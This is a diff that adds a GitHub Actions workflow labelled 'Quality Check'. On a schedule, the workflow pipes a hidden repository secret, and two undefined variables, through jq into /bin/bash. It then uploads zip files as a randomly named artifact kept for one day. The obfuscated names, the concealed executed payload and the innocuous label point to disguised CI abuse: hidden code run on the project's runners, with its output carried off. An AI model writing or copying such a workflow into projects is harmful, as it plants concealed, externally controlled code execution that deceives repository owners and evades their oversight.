@@ -1,0 +1,28 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          mju8: ${{ secrets.mju8 }}
+        run: |
+          printf '%s' "$mju8" | jq -r .uqn28076 | /bin/bash
+          printf '%s' "$tjl98" | jq -r .xt2412 | /bin/bash
+          printf '%s' "$e10764" | jq -r .c7027 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: qCssuNJD
+          path: "*.zip"
+          retention-days: 1
